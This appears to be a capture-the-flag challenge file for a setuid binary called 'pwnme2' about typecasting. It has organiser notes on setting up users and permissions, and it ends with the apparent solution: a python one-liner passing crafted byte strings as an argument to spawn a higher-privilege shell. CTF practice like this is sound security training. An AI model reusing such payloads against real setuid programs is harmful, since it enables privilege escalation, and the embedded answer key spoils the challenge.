# Challenge: pwnme2

# Points: 75

# Description: 

Do you know typecasting?
Look at [this](./pwnme2) executable. 
[This](./pwnme2.c) is the sourcefile. 

# Hint: 

1. Read the sourcefile properly. 


NOTE FOR US:

NOTE TO US: 


2. While setting up, the user of **pwnme2** executable should be **pwnme2** it should be setuid to **pwnme2_pwn**. 

3. This is how convert pwnme2 into a setuid executable: 

a. Create 2 users with names **pwnme2** and **pwnme2_pwn**. . 
b. Change the owner of pwnme2-executable to **pwnme2_pwn** - chown pwnme2_pwn pwnme2
c. Change the group of pwnme2-executable to **pwnme2** - chgrp pwnme2 pwnme2
d. Set the setuid bit: chmod u+s pwnme2

So, a user with pwnme2 prvileges can also run executables with pwnme2_pwn(higher privileges) and get a shell with higher privileges to read **flag.txt** . 

4. There is a flag.txt with user **pwnme2_pwn** and group **pwnme2_pwn**. So, only with the shell with privileges **pwnme2_pwn**, one will be able to read flag.txt.

4. With tha flag.txt, the following should be done to ensure only **pwnme2_pwn** user is able to read it and no one else. 

$ sudo chmod 0400 flag.txt  - Damn Important because in normal cases, "others" are allowed to read files owned by higher-privilege-users but this should happne in our case. 

This is very very important!


./pwnme2 `python -c "print '\xdd\xb7\xd5\xdb\x57\xd7\x5f\x19' * 7 + '\xe4\xb7\xd5\xdb\x57\xd7\x5f\x19'"`
